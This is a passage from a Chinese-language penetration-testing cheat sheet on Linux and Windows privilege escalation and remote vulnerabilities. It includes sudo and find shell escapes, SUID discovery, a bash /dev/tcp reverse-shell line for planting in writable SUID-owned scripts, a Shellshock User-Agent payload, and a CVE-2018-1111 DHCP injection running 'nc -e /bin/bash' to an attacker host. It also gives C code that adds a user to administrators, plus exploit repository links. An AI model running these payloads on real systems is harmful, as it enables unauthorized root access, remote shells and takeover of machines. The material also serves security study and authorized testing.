    sudo vi
    :!bash
    或
    :!/bin/sh
    或
    :set shell=/bin/sh
    :shell
    ```
- find
    ```bash
    find . -exec /bin/sh \;
    ```
---
#### suid
**找带 suid 的文件**
并不是说程序存在 suid 位就可以提权,还需要看程序的所有者
```bash
find / -perm -u=s 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000-print2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \;
```
筛选出其中所有人有 rwx 权限的文件,添加如下一句话:
```bash
bash -i >& /dev/tcp//port 0>&1
```
---
### 远程漏洞
**CVE-2014-6271** Bash 远程代码执行漏洞"破壳"
- 简介
    GNU Bash 是美国软件开发者布莱恩-福克斯（Brian J. Fox）为 GNU 计划而编写的一个 Shell（命令语言解释器），它运行于类 Unix 操作系统中（Linux 系统的默认 Shell），并能够从标准输入设备或文件中读取、执行命令，同时也结合了一部分 ksh 和 csh 的特点。
    GNU Bash 4.3 及之前版本中存在安全漏洞，该漏洞源于程序没有正确处理环境变量值内的函数定义。远程攻击者可借助特制的环境变量利用该漏洞执行任意代码。以下产品和模块可能会被利用：OpenSSH sshd 中的 ForceCommand 功能，Apache HTTP Server 中的 mod_cgi 和 mod_cgid 模块，DHCP客户端等。（说明：该漏洞的补丁并没有完全修复该问题，CNNVD-201409-956 补充了不完整修复后仍存在的问题）
- 相关文章
    - [Bash远程代码执行漏洞"破壳"(CVE-2014-6271)分析](https://www.antiy.com/response/CVE-2014-6271.html)
- POC | Payload | exp
    - [scottjpack/shellshock_scanner](https://github.com/scottjpack/shellshock_scanner)
    - [Bash - 'Shellshock' Environment Variables Command Injection](https://www.exploit-db.com/exploits/34766)
- 本地验证方法
    `env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"`
    执行命令后,如果显示 Vulnerable CVE-2014-6271,证系统存在漏洞,可改变 echo Vulnerable CVE-2014-6271 为任意命令进行执行.
    `User-Agent: () { :;}; whoami`
- MSF 模块
    ```bash
    use exploit/linux/http/ipfire_bashbug_exec
    use exploit/multi/http/cups_bash_env_exec
    use exploit/unix/dhcp/bash_environment
    ```
**CVE-2015-7547**
- 简介
    Google 安全团队发现 glibc 存在的溢出漏洞。glibc 的 DNS 客户端解析器中存在基于栈的缓冲区溢出漏洞。当软件用到 getaddrinfo 库函数（处理名字到地址以及服务到端口的转换）时，攻击者便可借助特制的域名、DNS 服务器或中间人攻击利用该漏洞，控制软件，并试图控制整个系统。
    攻击者使用恶意的 DNS 域名服务器创建类似于 evildomain.com 的域名，然后向目标用户发送带有指向该域名的链接的邮件，一旦用户点击该链接，客户端或浏览器将会开始查找 evildomain.com，并最终得到恶意服务器的 buffer-busting 响应。该域名被嵌入服务器日志中，一旦解析就会触发远程代码执行，SSH 客户端也会因此被控制。或者，位于目标用户网络中的中间人攻击者可以篡改 DNS 响应，向恶意代码中动态注入负载。
    简单的说，只要控制了 linux 服务器所访问的 DNS 服务器，或者对 linux 服务器的流量进行劫持；那么，在 Linux 服务器做 DNS 请求时，恶意 DNS 服务器就可以对 linux 服务器进行远程溢出攻击，获取服务器权限。
- 相关文章
    - [CVE-2015-7547 - sevck](https://www.cnblogs.com/sevck/p/5225639.html)
    - [CVE-2015-7547的漏洞分析](http://blog.nsfocus.net/cve-2015-7547-vulnerability-analysis/)
- POC | Payload | exp
    - [fjserna/CVE-2015-7547](https://github.com/fjserna/CVE-2015-7547)
**CVE-2018-1111** DHCP 客户端脚本代码执行漏洞
- 简介
    Fedora 是由 Fedora 项目社区开发、美国红帽（Red Hat）公司赞助的一套基于 Linux 的操作系统。DHCP packages 是其中的一个动态主机配置协议软件包。
    Fedora 28 及之前版本、Red Hat Enterprise Linux 6 和 7 中的 DHCP 包的 NetworkManager integration 脚本存在命令注入漏洞。本地攻击者可通过伪造 DHCP 响应利用该漏洞在系统以 root 权限执行任意命令。
- 相关文章
    - [CVE-2018-1111 复现环境搭建与 dhcp 命令注入](https://www.freebuf.com/articles/web/191884.html)
    - [DHCP 客户端脚本代码执行漏洞分析 (CVE-2018-1111) ](https://xz.aliyun.com/t/2455)
- POC | Payload | exp
    - [knqyf263/CVE-2018-1111](https://github.com/knqyf263/CVE-2018-1111)
    - [kkirsche/CVE-2018-1111](https://github.com/kkirsche/CVE-2018-1111)
- 本地利用方法
    ```
    attacker: kali linux 2018 x64 192.168.71.5
    victim: Centos 7 x64 192.168.71.10
    ```
    ```vim
    vim dnsmasq.conf
    bind-interfaces
    interface=eth0
    except-interface=lo
    dhcp-range=192.168.71.10,192.168.71.20,12h
    dhcp-option=3,192.168.71.5
    dhcp-option=6,192.168.71.5
    log-queries
    log-facility=/var/log/dnsmasq.log
    ```
    ```
    dnsmasq -dC dnsmasq.conf --dhcp-option="252,malayke'&nc -e /bin/bash192.168.71.5 6666 #"
    nc -l -p 6666 -v
    ```
    重启 CentOS 的网络服务,然后 shell 就反弹回来了
---
## Windows
**相关资源**
- [WindowsExploits/Exploits](https://github.com/WindowsExploits/Exploits)- Windows Exploits
- [Ascotbe/Kernelhub](https://github.com/Ascotbe/Kernelhub)
---
### 提权漏洞
**相关文章**
- [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
- [Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [猫鼠游戏：Windows内核提权样本狩猎思路分享](https://mp.weixin.qq.com/s/j72DUDKS8MX4iA10WBs2XA)
- [Windows 提权汇总](http://ryze-t.com/posts/2022/01/18/Windows-%E6%8F%90%E6%9D%83%E6%B1%87%E6%80%BB.html)
**提权辅助工具**
- [windows 本地提权对照表](http://www.7kb.org/138.html)
- [提权辅助网页](https://i.hacking8.com/tiquan/)
- [Windows提权EXP在线搜索工具](http://blog.neargle.com/win-powerup-exp-index/)
- [BulletinSearch-微软官网提供的漏洞 excel 列表](http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx)
- [GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - 此工具将目标修补程序级别与 Microsoft 漏洞数据库进行比较,以便检测目标上可能缺少的修补程序.
- [bitsadmin/wesng](https://github.com/bitsadmin/wesng) - Windows Exploit Suggester
- [tengzhangchao/microsoftSpider](https://github.com/tengzhangchao/microsoftSpider) - 爬取微软漏洞信息,MS 对应的每个版本操作系统 KB 号以及补丁下载地址.
- [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) - Windows 平台提权漏洞集合
- [AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) - 将目标的修补程序与微软的漏洞数据库进行比较，以检测目标的潜在缺失修补程序。
- [akabe1/windows_exploit_dowser](https://github.com/akabe1/windows_exploit_dowser) - 一个简单的工具，可以用来识别影响 Windows 操作系统的漏洞。
- [itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) - Privilege Escalation Enumeration Script for Windows
**添加开机启动项**
useradd.c
```C
#include 
int main ()
{
    int i;
    i=system ("net localgroup adminstrators lowpriv /add");
    return 0;
}
```
```
i586-mingw32msvc-gcc useradd.c -o useradd.exe
```
将 useradd.exe 传到目标机上,用 useradd.exe 去替换 everyone 完成控制且以系统权限开机自启的 exe,即可将用户 lowpriv 提升为管理员权限
查看一个程序的各个用户权限: `icacls xxx.exe`
**CVE-2016-3225 && MS16-075**
- 简介
    Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。
- POC | Payload | exp
    - [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075)
**CVE-2016-7255 && MS16-135**
- 相关文章
    - [CVE-2016-7255：分析挖掘Windows内核提权漏洞](https://www.anquanke.com/post/id/85232)
- POC | Payload | exp
    - https://github.com/tinysec/public/tree/master/CVE-2016-7255
    - https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2016-7214
**CVE-2017-0050 && MS17-017**
- POC | Payload | exp
    - https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2017-0050
**schedsvc!SchRpcSetSecurity() 漏洞**
- 相关文章
    - [技术讨论 | Windows全版本提权之Win10系列解析](https://www.freebuf.com/vuls/184090.html)
- POC | Payload | exp
    - [alpha1ab/Win2016LPE](https://github.com/alpha1ab/Win2016LPE)
**CVE-2018-8120**
- 简介
    Microsoft Windows 中存在提权漏洞，该漏洞源于 Win32k 组件没有正确的处理内存中的对象。攻击者可利用该漏洞在内核模式下以提升的权限执行任意代码。
- 影响版本
    - Microsoft Windows 7 SP1
    - Windows Server 2008 SP2
    - Windows Server 2008 R2 SP1
- 相关文章
    - [关于CVE-2018-8120的最新Windows提权漏洞分析](https://www.freebuf.com/vuls/174183.html)
- POC | Payload | exp
    - [unamer/CVE-2018-8120: CVE-2018-8120 Windows LPE exploit](https://github.com/unamer/CVE-2018-8120)
    - [alpha1ab/CVE-2018-8120: CVE-2018-8120 Exploit for Win2003 Win2008 WinXP Win7](https://github.com/alpha1ab/CVE-2018-8120)
**CVE-2019-0803**
- 相关文章
    - [CVE-2019-0803复现调试笔记](https://bbs.pediy.com/thread-252645.htm)
- POC | Payload | exp
    - [ExpLife0011/CVE-2019-0803](https://github.com/ExpLife0011/CVE-2019-0803)
    - https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2019-0803
**CVE-2019-1132**
- 相关文章
    - [CVE-2019-1132详细分析](https://www.freebuf.com/column/214203.html)
- POC | Payload | exp
    - [Vlad-tri/CVE-2019-1132](https://github.com/Vlad-tri/CVE-2019-1132)
**CVE-2019-1215**
- 简介
    Microsoft Windows 和 Microsoft Windows Server 都是美国微软（Microsoft）公司的产品。Microsoft Windows 是一套个人设备使用的操作系统。Microsoft Windows Server 是一套服务器操作系统。
    Microsoft Windows 和 Microsoft Windows Server 中 ws2ifsl.sys(Winsock) 处理内存对象的方式存在提权漏洞。攻击者可借助特制的应用程序利用该漏洞以提升的权限执行代码。
- 影响版本
    - Windows_10
    - Windows 7 SP1
    - Windows 8.1
    - Windows RT 8.1
    - Windows Server 2008 SP2
    - Windows Server 2008 R2 SP1
    - Windows Server 2012
    - Windows Server 2012 R2
    - Windows Server 2016
    - Windows Server 2019
- 相关文章
    - [CVE-2019-1215 Analysis of a Use After Free in ws2ifsl](https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/)
- POC | Payload | exp
    - [bluefrostsecurity/CVE-2019-1215](https://github.com/bluefrostsecurity/CVE-2019-1215)
**CVE-2019-1388**